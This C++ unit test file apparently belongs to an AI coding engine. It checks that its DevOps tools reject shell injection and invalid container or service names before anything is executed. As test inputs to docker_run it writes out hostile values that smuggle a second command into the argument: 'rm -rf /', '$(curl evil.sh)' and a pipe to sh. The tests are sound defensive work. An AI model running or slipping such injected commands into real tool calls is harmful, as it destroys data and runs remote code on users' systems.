/*
 * test_devops_tools.cpp — безопасность и валидация DevOps-инструментов (4.4).
 *
 * Тестируем ветки валидации ДО запуска команд: shell-инъекция в docker_run,
 * санитизация имён контейнеров/сервисов. Команды (docker/systemctl) не
 * выполняются — только ветки «запрещено»/«невалидно».
 */

#include "test_framework.h"
#include "../core/tools_registry.h"
#include "../core/engine.h"
#include "../modules/devops/devops_tools.h"

using namespace coder;

static void init_engine_and_devops() {
    HostCallbacks cb;
    cb.llm_chat = [](const std::string&, const std::vector<ChatMsg>&, LlmReply&) { return false; };
    cb.llm_complete = [](const std::string&, const std::string&, std::string&) { return false; };
    cb.llm_is_connected = []() { return false; };
    cb.chat_event = [](const std::string&) {};
    Engine::instance().init(cb);
    devops::register_devops_tools();
}

/* --- docker_run: shell-инъекция --- */

TEST(docker_run_empty_cli_rejected) {
    init_engine_and_devops();
    ToolArgs a;  // cli пуст
    std::string r = ToolsRegistry::instance().run("docker_run", a);
    ASSERT_TRUE(r.find("укажи параметры запуска") != std::string::npos);
}

TEST(docker_run_semicolon_injection_blocked) {
    init_engine_and_devops();
    ToolArgs a;
    a.cli = "-d --name web nginx ; rm -rf /";
    std::string r = ToolsRegistry::instance().run("docker_run", a);
    ASSERT_TRUE(r.find("запрещено") != std::string::npos);
}

TEST(docker_run_subshell_injection_blocked) {
    init_engine_and_devops();
    ToolArgs a;
    a.cli = "-d --name web nginx $(curl evil.sh)";
    std::string r = ToolsRegistry::instance().run("docker_run", a);
    ASSERT_TRUE(r.find("запрещено") != std::string::npos);
}

TEST(docker_run_pipe_injection_blocked) {
    init_engine_and_devops();
    ToolArgs a;
    a.cli = "-d --name web nginx | sh";
    std::string r = ToolsRegistry::instance().run("docker_run", a);
    ASSERT_TRUE(r.find("запрещено") != std::string::npos);
}

/* --- docker_logs / systemd: санитизация имён --- */

TEST(docker_logs_invalid_name_rejected) {
    init_engine_and_devops();
    ToolArgs a;
    a.query = "!!!";  // sanitize_ident удалит всё — имя пустое
    std::string r = ToolsRegistry::instance().run("docker_logs", a);
    ASSERT_TRUE(r.find("невалидное имя контейнера") != std::string::npos);
}

TEST(systemd_status_invalid_name_rejected) {
    init_engine_and_devops();
    ToolArgs a;
    a.query = "!!!";  // sanitize_ident удалит всё — имя пустое
    std::string r = ToolsRegistry::instance().run("systemd_status", a);
    ASSERT_TRUE(r.find("невалидное имя сервиса") != std::string::npos);
}

TEST(devops_tools_registered) {
    init_engine_and_devops();
    auto& reg = ToolsRegistry::instance();
    ASSERT_TRUE(reg.has("docker_build"));
    ASSERT_TRUE(reg.has("docker_run"));
    ASSERT_TRUE(reg.has("docker_logs"));
    ASSERT_TRUE(reg.has("systemd_status"));
    ASSERT_TRUE(reg.has("nginx_test"));
    ASSERT_TRUE(reg.has("cron_list"));
    ASSERT_TRUE(reg.has("ssh_exec"));
}